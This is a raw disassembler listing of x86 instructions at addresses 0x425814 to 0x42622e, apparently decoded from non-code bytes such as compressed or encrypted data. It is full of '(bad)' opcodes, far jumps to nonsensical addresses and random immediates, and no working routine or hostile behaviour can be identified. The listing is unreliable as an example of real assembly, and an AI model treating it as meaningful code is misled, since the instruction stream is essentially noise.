  425814:	cmp    BYTE PTR [ebx+0x7e5c1e1d],al
  42581a:	push   cs
  42581b:	out    dx,eax
  42581c:	add    BYTE PTR ds:0xe91b8484,0x5b
  425823:	cmc    
  425824:	adc    ecx,DWORD PTR [ecx]
  425826:	sbb    eax,0x84fa4d9b
  42582b:	add    edx,edi
  42582d:	mov    cl,0xc6
  42582f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425830:	stc    
  425831:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425832:	xchg   ebp,eax
  425834:	push   es
  425835:	into   
  425836:	sahf   
  425837:	inc    edi
  425838:	scas   eax,DWORD PTR es:[edi]
  425839:	pop    ecx
  42583a:	cmp    BYTE PTR [bx+si],bl
  42583d:	mov    edi,0xe55ce9c0
  425842:	gs cld 
  425844:	mov    ds:0x4b53a694,eax
  425849:	loopne 0x4258bb
  42584b:	sahf   
  42584c:	xchg   edi,eax
  42584d:	test   al,0x9c
  42584f:	sbb    BYTE PTR [edi+0x67657a35],0xf9
  425856:	psrld  mm6,mm4
  425859:	retf   
  42585a:	push   ebx
  42585b:	std    
  42585c:	(bad)  
  42585d:	mov    ah,BYTE PTR [ebp-0x2d]
  425860:	add    BYTE PTR [ecx-0x6d],ch
  425863:	out    dx,eax
  425864:	sbb    al,0xdf
  425867:	pop    eax
  425868:	aam    0x9d
  42586a:	mov    al,0xf4
  42586c:	shr    DWORD PTR [ecx-0x9ab0923],cl
  425872:	sub    DWORD PTR [edx],ecx
  425874:	sub    ch,BYTE PTR [ebx]
  425876:	ret    0x1e36
  425879:	adc    DWORD PTR [eax-0x23],ecx
  42587c:	loopne 0x4258d9
  42587e:	add    eax,0xa1591161
  425883:	inc    edx
  425884:	inc    eax
  425885:	ins    DWORD PTR es:[edi],dx
  425886:	push   0xffffffa1
  425888:	call   0x4eb4fd08
  42588d:	jno    0x4258a5
  42588f:	stc    
  425890:	test   DWORD PTR [eax],0x0
	...
  4258f2:	add    BYTE PTR [eax],al
  4258f4:	pop    esp
  4258f5:	push   edx
  4258f6:	nop
  4258f7:	push   edx
  4258f8:	sahf   
  4258f9:	rcr    dh,cl
  4258fb:	pop    esi
  4258fc:	adc    BYTE PTR [edx+0x55],0x71
  425900:	pop    edi
  425901:	dec    esi
  425902:	sbb    ah,BYTE PTR [eax+0x19188]
  425908:	add    eax,0x96000001
  42590d:	mov    esp,DWORD PTR [ebx+0x21]
  425910:	into   
  425911:	and    ebp,DWORD PTR [edx]
  425913:	mov    cl,0xdd
  425915:	mov    ebx,0x2acc09d
  42591a:	sub    ebx,DWORD PTR [ecx-0x19]
  42591d:	mov    al,ds:0xea3c3d75
  425922:	mov    dh,0xa1
  425924:	loopne 0x425913
  425926:	add    DWORD PTR [ebx-0x55],ebp
  425929:	sub    BYTE PTR [edx+edx*4],bl
  42592c:	loopne 0x425947
  42592e:	dec    eax
  42592f:	iret   
  425930:	xor    edx,ebx
  425932:	xchg   esi,eax
  425933:	rol    BYTE PTR [ecx+0x1459b3d9],0x4b
  42593a:	push   ds
  42593b:	clc    
  42593c:	mov    bh,0x84
  42593e:	call   0x1c81:0x6500cb2b
  425945:	mov    cs,ebx
  425947:	in     al,dx
  425948:	pop    edx
  425949:	xor    BYTE PTR [ecx-0x7cb4b2aa],0x2c
  425950:	xchg   esp,eax
  425951:	sbb    DWORD PTR [ebx-0x449d1cf0],ecx
  425957:	jecxz  0x42591c
  425959:	xor    eax,0xe72f6b6b
  42595e:	mov    dl,0x7b
  425960:	in     eax,dx
  425961:	cmp    DWORD PTR [ebx],ebx
  425963:	stos   DWORD PTR es:[edi],eax
  425964:	inc    ebx
  425965:	sbb    eax,0xb073ce1b
  42596a:	adc    esi,esi
  42596c:	sub    BYTE PTR [edi-0x70],ch
  42596f:	xor    al,0x33
  425971:	pop    ss
  425972:	call   0x84a1:0xb24c3197
  425979:	test   eax,0x3f57fdc0
  42597e:	rcr    DWORD PTR [esi-0x2a1c62d9],1
  425984:	lods   al,BYTE PTR ds:[esi]
  425985:	lds    esp,FWORD PTR ds:0x5ed1efe5
  42598b:	ja     0x4259b1
  42598d:	jnp    0x42596a
  42598f:	xchg   ebx,eax
  425990:	xchg   esi,esp
  425992:	and    DWORD PTR [ebx],ebx
  425994:	mov    bh,0x8f
  425996:	scas   al,BYTE PTR es:[edi]
  425997:	(bad)  
  425998:	call   0xf7993c2c
  42599d:	ins    BYTE PTR es:[edi],dx
  42599e:	rcr    BYTE PTR [eax+0x2b646cc3],0x46
  4259a5:	stos   BYTE PTR es:[edi],al
  4259a6:	jge    0x425933
  4259a8:	(bad)  
  4259a9:	xchg   ebx,eax
  4259aa:	cs pop eax
  4259ac:	mov    esi,0x751ce343
  4259b1:	xchg   edx,eax
  4259b2:	jmp    0x42595e
  4259b4:	pop    es
  4259b5:	leave  
  4259b6:	fcom   QWORD PTR [eax-0x35eb1b2e]
  4259bc:	icebp  
  4259bd:	cli    
  4259be:	ret    0x27c4
  4259c1:	cwde   
  4259c2:	mov    eax,ds:0xeabcc8e5
  4259c7:	adc    eax,0x65a28c82
  4259cc:	aaa    
  4259cd:	or     esp,edx
  4259cf:	rcl    bl,0xf3
  4259d2:	popf   
  4259d3:	stos   DWORD PTR es:[edi],eax
  4259d4:	push   eax
  4259d5:	clc    
  4259d6:	cdq    
  4259d7:	js     0x4259e3
  4259d9:	jnp    0x425a4d
  4259db:	fs call 0x4456ed5f
  4259e1:	in     al,dx
  4259e2:	xchg   ecx,eax
  4259e3:	inc    ebx
  4259e4:	shr    BYTE PTR [esi+0x60],cl
  4259e7:	pusha  
  4259e8:	daa    
  4259e9:	push   0x324a8b91
  4259ee:	in     eax,0x66
  4259f0:	fimul  DWORD PTR [esi-0x2e]
  4259f3:	test   BYTE PTR [esi+0x4c],ch
  4259f6:	pop    es
  4259f7:	inc    ebp
  4259f8:	push   cs
  4259f9:	sar    BYTE PTR [eax],1
  4259fb:	test   eax,0x3ae714bb
  425a00:	mov    ebx,0x5e25a219
  425a05:	enter  0xc309,0xea
  425a09:	daa    
  425a0a:	pop    esi
  425a0b:	dec    ebp
  425a0c:	std    
  425a0d:	or     ch,BYTE PTR [ecx]
  425a0f:	sahf   
  425a10:	pop    DWORD PTR [eax]
	...
  425a72:	add    BYTE PTR [eax],al
  425a74:	shl    DWORD PTR [ebx+0x4],0x67
  425a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a79:	jcxz   0x425a63
  425a7c:	(bad)  
  425a7d:	fimul  DWORD PTR [edi+eax*4-0x39ec9677]
  425a84:	lea    edx,[edx+0x1050001]
  425a8a:	add    BYTE PTR [eax],al
  425a8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425a8d:	cdq    
  425a8e:	inc    ecx
  425a8f:	mov    esi,0xb86d255
  425a94:	push   0xe
  425a96:	cdq    
  425a97:	icebp  
  425a98:	cmovnp esp,DWORD PTR [ebp+0x23]
  425a9c:	mov    al,ds:0x233baed2
  425aa1:	mov    ebx,0xeb5de6a6
  425aa6:	int3   
  425aa7:	cmp    DWORD PTR [esp+ebx*2],0x7d850bfc
  425aae:	dec    edx
  425aaf:	(bad)  
  425ab0:	mov    dh,0x1a
  425ab2:	iret   
  425ab3:	mov    edi,0x50d116
  425ab8:	(bad)  
  425ab9:	or     edi,DWORD PTR ds:0x3e8638c8
  425abf:	dec    ebx
  425ac0:	adc    esi,DWORD PTR [ebx+0x4b485f3d]
  425ac6:	dec    ecx
  425ac7:	ja     0x425b48
  425ac9:	shl    DWORD PTR [edi+0xddfaa1b],0x6b
  425ad0:	aad    0xac
  425ad2:	(bad)  
  425ad3:	jbe    0x425aef
  425ad5:	mov    edi,0xfe926194
  425ada:	loop   0x425b42
  425adc:	(bad)  
  425add:	cmp    DWORD PTR [ebx-0x373abd48],edi
  425ae3:	sub    bl,BYTE PTR [ebp+0x148ea2ef]
  425ae9:	in     eax,dx
  425aea:	rcl    DWORD PTR [edx],cl
  425aec:	cdq    
  425aed:	xor    edi,ebp
  425aef:	mov    ds:0x8113c998,al
  425af4:	add    edi,esi
  425af6:	popa   
  425af7:	adc    BYTE PTR [edx],dl
  425af9:	shl    DWORD PTR [eax],cl
  425afb:	lods   eax,DWORD PTR ds:[esi]
  425afc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425afd:	fsubr  DWORD PTR cs:[edx+0xe]
  425b01:	push   edi
  425b02:	rcl    esi,cl
  425b04:	mov    ch,0xca
  425b06:	cmp    edx,edx
  425b08:	and    al,0x94
  425b0a:	fs test edx,0xd399809a
  425b11:	shl    BYTE PTR [ecx],1
  425b13:	xor    BYTE PTR [eax+edi*1-0x5b22353e],ch
  425b1a:	ret    0xc280
  425b1d:	jp     0x425b28
  425b1f:	add    al,0x5e
  425b21:	leave  
  425b22:	(bad)  
  425b23:	out    0x8,eax
  425b25:	mov    ?,WORD PTR [esi-0x4ac22db9]
  425b2b:	sub    BYTE PTR [esi+esi*8-0x45a34695],bh
  425b32:	scas   al,BYTE PTR es:[edi]
  425b33:	mov    ds:0x4c63e045,al
  425b38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425b39:	push   esi
  425b3a:	cs out dx,al
  425b3c:	adc    BYTE PTR [edx],0x6d
  425b3f:	fcom   DWORD PTR [ecx-0x51]
  425b42:	push   ebp
  425b43:	call   0x2b74:0xb7aa4f1f
  425b4a:	verw   bx
  425b4d:	fs dec eax
  425b4f:	cmp    dl,0xa3
  425b52:	dec    ebp
  425b53:	dec    esp
  425b54:	xlat   BYTE PTR ds:[ebx]
  425b55:	adc    al,0x43
  425b57:	jecxz  0x425b73
  425b59:	xor    edx,DWORD PTR [ecx+edx*4+0x4a]
  425b5d:	inc    ecx
  425b5e:	stos   BYTE PTR es:[edi],al
  425b5f:	ret    0xfcd
  425b62:	jp     0x425b50
  425b64:	test   edi,edi
  425b66:	inc    edx
  425b67:	stos   DWORD PTR es:[edi],eax
  425b68:	sub    DWORD PTR [eax-0x59],edx
  425b6b:	clc    
  425b6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425b6d:	adc    esp,ebp
  425b6f:	adc    edx,ebx
  425b71:	in     al,dx
  425b72:	adc    BYTE PTR [esi],ch
  425b74:	popf   
  425b75:	cmp    ecx,edx
  425b77:	clc    
  425b78:	into   
  425b79:	mov    ebx,0x82bddeb3
  425b7e:	mov    eax,ds:0x96697ea
  425b83:	sbb    BYTE PTR [esi],ah
  425b85:	sahf   
  425b86:	sbb    BYTE PTR fs:[eax-0x180c839c],dl
  425b8d:	cmp    ebp,DWORD PTR [ebx-0x47]
  425b90:	xchg   edx,eax
	...
  425bf1:	add    BYTE PTR [eax],al
  425bf3:	add    ah,al
  425bf5:	clc    
  425bf6:	jnp    0x425c4e
  425bf8:	jg     0x425bd1
  425bfa:	in     eax,dx
  425bfb:	cli    
  425bfc:	enter  0xe6cd,0x96
  425c00:	test   edi,edx
  425c02:	fwait
  425c03:	pop    edi
  425c04:	xchg   edx,eax
  425c05:	xchg   ebx,eax
  425c06:	add    DWORD PTR [eax],eax
  425c08:	add    eax,0x16000001
  425c0d:	in     eax,dx
  425c0e:	mov    esi,0x6a001c85
  425c13:	and    ch,cl
  425c15:	lods   eax,DWORD PTR ds:[esi]
  425c16:	int3   
  425c17:	fimul  DWORD PTR [eax-0x5e8c9aaf]
  425c1d:	sbb    dl,al
  425c1f:	icebp  
  425c20:	repnz adc ebx,DWORD PTR [ebx-0x10]
  425c24:	xor    al,0xe
  425c26:	in     eax,dx
  425c27:	clc    
  425c28:	cmp    esp,ecx
  425c2a:	dec    ebp
  425c2b:	test   BYTE PTR [ebp-0x5c167040],bl
  425c31:	push   ds
  425c32:	(bad)  
  425c33:	inc    ebp
  425c34:	mov    eax,ds:0x7fa0845c
  425c39:	jo     0x425c45
  425c3b:	jne    0x425c72
  425c3d:	fld    QWORD PTR [ebp+0x624a86d8]
  425c43:	std    
  425c44:	inc    ebp
  425c45:	in     eax,dx
  425c46:	cmc    
  425c47:	xchg   esi,eax
  425c48:	imul   ebp,DWORD PTR [eax],0x8218eb7f
  425c4e:	jmp    0xc30eaf29
  425c53:	xchg   BYTE PTR es:[esi+0x1c1361c7],ch
  425c5a:	shl    BYTE PTR [ecx+0x56],1
  425c5d:	retf   0xadb6
  425c60:	inc    edi
  425c61:	mov    eax,ds:0x1aa0ef6a
  425c66:	(bad)  
  425c67:	jecxz  0x425c3b
  425c69:	sbb    BYTE PTR [ebp+edi*4-0x6fd9e433],dl
  425c70:	dec    edx
  425c71:	icebp  
  425c72:	sub    eax,0x66866b9e
  425c77:	fsub   DWORD PTR [ebx]
  425c79:	iret   
  425c7a:	mov    ds:0x38952c95,eax
  425c7f:	jge    0x425c89
  425c81:	iret   
  425c82:	add    DWORD PTR [esi+0x70df2d71],eax
  425c88:	push   esi
  425c89:	js     0x425c8b
  425c8b:	loope  0x425d08
  425c8d:	adc    eax,0x1d105bdd
  425c92:	jno    0x425cc0
  425c94:	add    ebp,DWORD PTR [ebp-0x3b]
  425c97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425c98:	cld    
  425c99:	push   ds
  425c9a:	stos   DWORD PTR es:[edi],eax
  425c9b:	dec    ebp
  425c9c:	int3   
  425c9d:	loope  0x425cb7
  425c9f:	push   0x1a
  425ca1:	lea    ebp,[edi]
  425ca3:	pop    eax
  425ca4:	add    DWORD PTR [esi],ebx
  425ca6:	scas   eax,DWORD PTR es:[edi]
  425ca7:	in     eax,dx
  425ca8:	(bad)  
  425ca9:	sar    DWORD PTR [ebx],cl
  425cab:	sub    BYTE PTR [ecx],0x69
  425cae:	xor    BYTE PTR [esi+0x515ef459],al
  425cb4:	lods   eax,DWORD PTR ds:[esi]
  425cb5:	je     0x425ceb
  425cb7:	pop    esi
  425cb8:	sub    bh,BYTE PTR [ebx-0x72]
  425cbb:	sub    eax,DWORD PTR [edx]
  425cbd:	adc    esp,ecx
  425cbf:	fstp   QWORD PTR [esi+0x2a7178df]
  425cc5:	mov    ch,0x7
  425cc7:	inc    BYTE PTR [ebx]
  425cc9:	test   edi,ebx
  425ccb:	in     al,dx
  425ccc:	inc    esi
  425ccd:	inc    ecx
  425cce:	sub    al,0x6f
  425cd0:	jmp    0x6bfb:0x49541393
  425cd7:	bound  ebp,QWORD PTR [esi+0x46d093b7]
  425cdd:	sub    DWORD PTR [edx-0x11a9c417],eax
  425ce3:	fs in  al,dx
  425ce5:	push   ds
  425ce6:	cmp    DWORD PTR [ecx],ebx
  425ce8:	xchg   ebp,eax
  425ce9:	adc    eax,0x6f8501c0
  425cee:	(bad)  
  425cef:	push   ds
  425cf0:	inc    edi
  425cf1:	sub    BYTE PTR [edx+0x29717579],al
  425cf7:	jge    0x425c8a
  425cf9:	mov    al,ds:0x976100ea
  425cfe:	int    0x43
  425d00:	dec    edx
  425d01:	xor    al,0x38
  425d03:	(bad)  
  425d05:	ret    
  425d06:	xor    ebx,ebx
  425d08:	or     al,0x44
  425d0a:	mov    ecx,0xd46febf6
  425d0f:	int3   
  425d10:	mov    eax,DWORD PTR [eax]
	...
  425d72:	add    BYTE PTR [eax],al
  425d74:	jmp    FWORD PTR [esp+ebx*8-0x8820f9]
  425d7b:	cld    
  425d7c:	gs addr16 stc 
  425d7f:	mov    ds:0xf90655ff,al
  425d84:	xchg   edi,eax
  425d85:	xchg   esp,eax
  425d86:	add    DWORD PTR [eax],eax
  425d88:	add    eax,0x99000001
  425d8d:	adc    al,0x86
  425d8f:	inc    edi
  425d90:	jne    0x425d3c
  425d92:	enter  0x7b7,0xf3
  425d96:	ror    edx,0x18
  425d99:	mov    dh,0xb1
  425d9b:	fcom   QWORD PTR [ebx+0x60b40711]
  425da1:	mov    bl,0xca
  425da3:	loop   0x425d82
  425da5:	pop    ebx
  425da6:	inc    ebp
  425da7:	jge    0x425dfe
  425da9:	pop    eax
  425daa:	jns    0x425d85
  425dac:	out    dx,al
  425dad:	iret   
  425dae:	xor    esi,DWORD PTR [esi+0x34b9fc9]
  425db4:	scas   eax,DWORD PTR es:[edi]
  425db5:	or     al,BYTE PTR [esp+ecx*8-0x6265517c]
  425dbc:	xchg   ebp,eax
  425dbd:	sbb    ecx,DWORD PTR [edi+edi*4]
  425dc0:	mov    DWORD PTR [edx+0x3aff88d2],esp
  425dc6:	jl     0x425e39
  425dc8:	or     BYTE PTR [eax-0x42],dh
  425dcb:	test   eax,0xfd90bead
  425dd0:	add    DWORD PTR [edi],eax
  425dd2:	cwde   
  425dd3:	in     al,dx
  425dd4:	pusha  
  425dd5:	lds    esi,FWORD PTR [eax-0xd]
  425dd8:	inc    edi
  425dd9:	push   0x35210df
  425dde:	dec    edx
  425ddf:	push   eax
  425de0:	pop    ecx
  425de1:	popa   
  425de2:	mov    ebx,ebp
  425de4:	fld    TBYTE PTR [eax-0x2d28fc11]
  425dea:	popf   
  425deb:	cmp    al,ch
  425ded:	jno    0x425e45
  425def:	lds    ecx,FWORD PTR [ecx-0x66]
  425df2:	inc    ecx
  425df3:	push   edx
  425df4:	les    edx,FWORD PTR [ecx]
  425df6:	jns    0x425d9f
  425df8:	int3   
  425df9:	add    ah,dh
  425dfb:	push   esp
  425dfc:	jl     0x425e7b
  425dfe:	and    ebx,DWORD PTR [ebp+esi*8+0x2550c3da]
  425e05:	test   BYTE PTR [edi],bh
  425e07:	fwait
  425e08:	dec    esi
  425e09:	and    al,0x6c
  425e0b:	sbb    edx,DWORD PTR [ecx+esi*4]
  425e0e:	xchg   esi,eax
  425e0f:	inc    edi
  425e10:	pusha  
  425e11:	mov    ?,WORD PTR [eax-0x29ac0300]
  425e17:	pop    es
  425e18:	ins    BYTE PTR es:[edi],dx
  425e19:	rol    DWORD PTR [edx+0x5b7f6cc7],0xad
  425e20:	sub    BYTE PTR [ecx-0x2bc6436d],cl
  425e26:	xchg   BYTE PTR [ebx+ecx*4-0x65184ed3],bl
  425e2d:	scas   al,BYTE PTR es:[edi]
  425e2e:	sub    eax,0xaaa3e0
  425e33:	mov    BYTE PTR [edx-0x1b],dh
  425e36:	stos   DWORD PTR es:[edi],eax
  425e37:	jle    0x425de9
  425e39:	retf   
  425e3a:	dec    sp
  425e3c:	push   ecx
  425e3d:	mov    DWORD PTR [edi-0x1e],0x4fcf2a99
  425e44:	test   DWORD PTR ds:0x7864c624,ebp
  425e4a:	mov    ah,BYTE PTR [esi-0x2c]
  425e4d:	shl    DWORD PTR [eax+0x75],0x4c
  425e51:	xchg   ebp,eax
  425e52:	mov    ch,0x85
  425e54:	jne    0x425e3c
  425e56:	jb     0x425de1
  425e58:	push   cs
  425e59:	stc    
  425e5a:	mov    BYTE PTR [ebp-0x16],bl
  425e5d:	sub    BYTE PTR [esi-0x31],dh
  425e60:	addr16 pusha 
  425e62:	mov    eax,0xc73b6a67
  425e67:	or     BYTE PTR [edx+0x2],dl
  425e6a:	enter  0xee73,0xef
  425e6e:	inc    ecx
  425e6f:	jl     0x425e59
  425e71:	mov    cl,0x9b
  425e73:	retf   
  425e74:	mov    WORD PTR [ebx-0x34c61706],ds
  425e7a:	mov    ds:0xc12e1bb2,al
  425e7f:	or     BYTE PTR [esp+ebx*8-0x47b65f4b],ch
  425e86:	jae    0x425f02
  425e88:	out    dx,eax
  425e89:	sub    esp,edx
  425e8b:	loop   0x425e39
  425e8d:	inc    ecx
  425e8e:	inc    esp
  425e8f:	push   edi
  425e90:	rol    DWORD PTR [eax],0x0
	...
  425ef3:	add    dh,al
  425ef5:	jl     0x425f48
  425ef7:	sar    bl,1
  425ef9:	std    
  425efa:	(bad)  
  425efb:	jle    0x425ec9
  425efd:	pop    ss
  425efe:	popf   
  425eff:	scas   eax,DWORD PTR es:[edi]
  425f00:	mov    al,0xb0
  425f02:	jl     0x425ec1
  425f04:	pushf  
  425f05:	xchg   ebp,eax
  425f06:	add    DWORD PTR [eax],eax
  425f08:	add    eax,0x75000001
  425f0d:	outs   dx,DWORD PTR ds:[esi]
  425f0e:	inc    edx
  425f0f:	ins    DWORD PTR es:[edi],dx
  425f10:	pop    edi
  425f11:	mov    al,0x82
  425f13:	pop    ss
  425f14:	pop    ebx
  425f15:	xchg   esp,eax
  425f16:	lock xchg BYTE PTR [ecx+0x5],dh
  425f1a:	or     eax,0x668448d4
  425f1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425f20:	popf   
  425f21:	xchg   esp,eax
  425f22:	mov    ecx,edx
  425f24:	addr16 sbb al,0x5c
  425f27:	popa   
  425f28:	mov    eax,ds:0x30b932ba
  425f2d:	add    DWORD PTR [esi+0x18],0xffffff9f
  425f31:	xor    al,0x48
  425f33:	sti    
  425f34:	xchg   esp,eax
  425f35:	push   ss
  425f36:	rol    al,cl
  425f38:	repz xchg ebp,eax
  425f3a:	out    dx,eax
  425f3b:	fdivr  DWORD PTR [ebx]
  425f3d:	xchg   edx,eax
  425f3e:	fwait
  425f3f:	push   cs
  425f40:	mov    cl,BYTE PTR [edx+0x7a]
  425f43:	mov    eax,0xb20ea814
  425f48:	xchg   esi,eax
  425f49:	sub    eax,0x8f1d067a
  425f4e:	mov    edi,0x8aa72cfb
  425f53:	xchg   esp,eax
  425f54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425f56:	mov    fs,WORD PTR [ebx-0x192f3fcf]
  425f5c:	imul   esp,DWORD PTR [ebx+0x2d],0xcf27f627
  425f63:	fadd   st,st(5)
  425f65:	jmp    0x258fbd1c
  425f6a:	mov    esi,0x59ea87f2
  425f6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425f70:	or     DWORD PTR [ebp-0x526c55d1],esp
  425f76:	jecxz  0x425fa8
  425f78:	call   0x4fe29460
  425f7d:	jle    0x425fbd
  425f7f:	inc    esi
  425f80:	xor    al,0xaf
  425f82:	dec    ebx
  425f83:	xchg   edi,eax
  425f84:	jo     0x425fba
  425f86:	enter  0xf1a,0x7e
  425f8a:	pusha  
  425f8b:	into   
  425f8c:	fxsave [edx+0x2c]
  425f90:	push   cs
  425f91:	stc    
  425f92:	(bad)  
  425f93:	cmc    
  425f94:	sti    
  425f95:	(bad)  
  425f96:	jecxz  0x425f23
  425f98:	rcl    BYTE PTR [ebx+0x33d6b8d5],cl
  425f9e:	jbe    0x425fdb
  425fa0:	test   BYTE PTR [esi],0xc6
  425fa3:	(bad)  
  425fa4:	pop    ebx
  425fa5:	mov    WORD PTR [ecx+edx*1],cs
  425fa8:	loopne 0x425f98
  425faa:	push   ds
  425fab:	mov    ebp,0x33699404
  425fb0:	cmp    BYTE PTR [eax+0x4e1ade9d],dl
  425fb6:	lods   eax,DWORD PTR ds:[esi]
  425fb7:	stos   BYTE PTR es:[edi],al
  425fb8:	(bad)
  425fbb:	data16 ficomp WORD PTR [ecx+0x6b]
  425fbf:	xlat   BYTE PTR ds:[ebx]
  425fc0:	xchg   ebp,eax
  425fc1:	or     al,0x75
  425fc3:	call   0xb8184645
  425fc8:	imul   ecx,DWORD PTR ds:0xa443ca68,0x42fcdd76
  425fd2:	mov    al,0xaf
  425fd4:	sbb    esi,edi
  425fd6:	retf   
  425fd7:	push   0x3ec4750e
  425fdc:	in     al,dx
  425fdd:	push   ss
  425fde:	xchg   ecx,eax
  425fdf:	mov    eax,ds:0xa8dda9cd
  425fe4:	and    esi,esp
  425fe6:	jmp    0xaa1534c9
  425feb:	test   BYTE PTR fs:[edi],bh
  425fee:	call   FWORD PTR ds:0x20cc667a
  425ff4:	xchg   esp,eax
  425ff5:	cdq    
  425ff6:	aad    0xf5
  425ff8:	(bad)  
  425ff9:	cdq    
  425ffa:	mov    eax,ds:0xaa2ca6ca
  425fff:	mov    eax,0xbcf5517c
  426004:	pop    esi
  426005:	sbb    BYTE PTR [ebx],dl
  426007:	scas   al,BYTE PTR es:[edi]
  426008:	or     BYTE PTR [edi-0x4746259c],bh
  42600e:	jbe    0x425ff7
  426010:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  426071:	add    BYTE PTR [eax],al
  426073:	add    BYTE PTR [ecx],bh
  426075:	cwde   
  426076:	or     eax,DWORD PTR [esi]
  426078:	stos   DWORD PTR es:[edi],eax
  426079:	xchg   edi,eax
  42607a:	cmp    eax,0x304575bf
  42607f:	in     al,dx
  426080:	xchg   ecx,eax
  426081:	pop    edx
  426082:	inc    ecx
  426083:	leave  
  426084:	mov    eax,ds:0x5000196
  426089:	add    DWORD PTR [eax],eax
  42608b:	add    BYTE PTR [eax+0x5],ch
  42608e:	dec    esp
  42608f:	je     0x426100
  426091:	dec    eax
  426092:	dec    ecx
  426093:	adc    BYTE PTR [esi+0x27],dl
  426096:	pop    edx
  426097:	push   ss
  426098:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426099:	jmp    0x1fd129d3
  42609e:	scas   eax,DWORD PTR es:[edi]
  42609f:	pop    esi
  4260a0:	mov    ebp,esp
  4260a2:	xchg   DWORD PTR [esi],ebx
  4260a4:	pop    eax
  4260a5:	mov    eax,ds:0xa134c569
  4260aa:	adc    DWORD PTR [esi-0x13d6680f],esp
  4260b0:	sbb    al,0x86
  4260b2:	pushf  
  4260b3:	popf   
  4260b4:	push   cs
  4260b5:	mov    cl,0x59
  4260b7:	dec    esi
  4260b8:	iret   
  4260b9:	fmul   st,st(2)
  4260bb:	fild   DWORD PTR [edi-0x65]
  4260be:	cli    
  4260bf:	xlat   BYTE PTR ds:[ebx]
  4260c0:	or     BYTE PTR [eax],ah
  4260c2:	out    dx,al
  4260c3:	adc    dl,BYTE PTR [esi-0x30a53d67]
  4260c9:	aad    0x83
  4260cb:	into   
  4260cc:	jno    0x4260a2
  4260ce:	ja     0x42614e
  4260d0:	outs   dx,DWORD PTR ds:[esi]
  4260d1:	xchg   esp,eax
  4260d2:	adc    ah,al
  4260d4:	cmp    al,0xaf
  4260d6:	lock cmp DWORD PTR [esi+0x51],esp
  4260da:	cli    
  4260db:	push   ds
  4260dc:	push   esi
  4260dd:	int    0x2f
  4260df:	stc    
  4260e0:	adc    esi,ecx
  4260e2:	aas    
  4260e3:	xor    eax,0x7236a8ad
  4260e8:	call   DWORD PTR [ebx-0x7c4a0160]
  4260ee:	cli    
  4260ef:	pushf  
  4260f0:	adc    ch,ah
  4260f2:	push   edx
  4260f3:	sub    eax,0xbb0d4269
  4260f8:	mov    cl,0x13
  4260fa:	inc    ebp
  4260fb:	xchg   BYTE PTR [esi],ah
  4260fd:	fadd   DWORD PTR [ebp+edi*1+0x4af3bf29]
  426104:	call   0x9d9c989e
  426109:	sbb    esi,edx
  42610b:	leave  
  42610c:	test   al,0xe3
  42610e:	mov    ds:0xdb846847,al
  426113:	jmp    0x4e5c:0x6ba4eb41
  42611a:	repz mov esi,esi
  42611d:	pop    ecx
  42611e:	lods   al,BYTE PTR ds:[esi]
  42611f:	mov    edi,0xa8d7b275
  426124:	cli    
  426125:	adc    BYTE PTR [ebp-0x75],0xed
  426129:	fsubr  st,st(1)
  42612b:	stos   BYTE PTR es:[edi],al
  42612c:	into   
  42612d:	sub    DWORD PTR [edi+0x3b9b0606],ebp
  426133:	cs jl  0x426100
  426136:	stos   DWORD PTR es:[edi],eax
  426137:	jl     0x426153
  426139:	xchg   edi,eax
  42613a:	xchg   ebx,eax
  42613b:	ret    
  42613c:	xor    di,bx
  42613f:	dec    ebp
  426140:	icebp  
  426141:	scas   al,BYTE PTR es:[edi]
  426142:	inc    edx
  426143:	(bad)  
  426144:	mov    esi,0x1faf76d6
  426149:	push   edx
  42614a:	std    
  42614b:	sbb    al,0x4a
  42614d:	neg    DWORD PTR [edx]
  42614f:	dec    ecx
  426150:	adc    DWORD PTR [edi],ecx
  426152:	lds    esi,FWORD PTR [edx-0x77e8e663]
  426158:	sub    ebx,ebp
  42615a:	in     al,dx
  42615b:	lods   eax,DWORD PTR ds:[esi]
  42615c:	int    0x1e
  42615e:	fs dec ebp
  426160:	inc    eax
  426161:	je     0x42614a
  426163:	xchg   ebp,eax
  426164:	mov    ebp,0x999cf8df
  426169:	inc    ecx
  42616a:	inc    ebx
  42616b:	or     cl,bl
  42616d:	add    ecx,ebx
  42616f:	imul   ecx,DWORD PTR [ebx-0x5],0xfffffffc
  426173:	adc    DWORD PTR [edx],ebp
  426175:	pop    ecx
  426176:	pop    ss
  426177:	int    0x9a
  426179:	clc    
  42617a:	adc    al,0x1b
  42617c:	lahf   
  42617d:	imul   ebx,DWORD PTR [ebx-0x676101d2],0x46
  426184:	mov    cs,WORD PTR [ecx+0x48fc71b6]
  42618a:	pop    edi
  42618b:	jmp    0xcd4a732e
  426190:	mov    edi,0x0
	...
  4261f1:	add    BYTE PTR [eax],al
  4261f3:	add    BYTE PTR [ebx-0x409ef0df],bl
  4261f9:	outs   dx,DWORD PTR ds:[esi]
  4261fa:	(bad)  
  4261fb:	sti    
  4261fc:	mov    bh,0x83
  4261fe:	mov    cl,0x27
  426200:	xchg   BYTE PTR [ebx-0x36],cl
  426203:	dec    ecx
  426204:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426205:	xchg   edi,eax
  426206:	add    DWORD PTR [eax],eax
  426208:	add    eax,0xb0000001
  42620d:	movntps XMMWORD PTR [esp+edx*1+0x79],xmm0
  426212:	lds    ecx,FWORD PTR [ebp+0x74014ab9]
  426218:	mov    al,ds:0x2a6de075
  42621d:	xchg   ebp,eax
  42621e:	jecxz  0x4261f8
  426220:	stos   DWORD PTR es:[edi],eax
  426221:	test   edi,ebp
  426223:	mov    dh,0x91
  426225:	and    dl,BYTE PTR [esi]
  426227:	in     al,dx
  426228:	retf   
  426229:	out    0x8f,al
  42622b:	daa    
  42622c:	jmp    0x4261b1
  42622e:	pop    ss
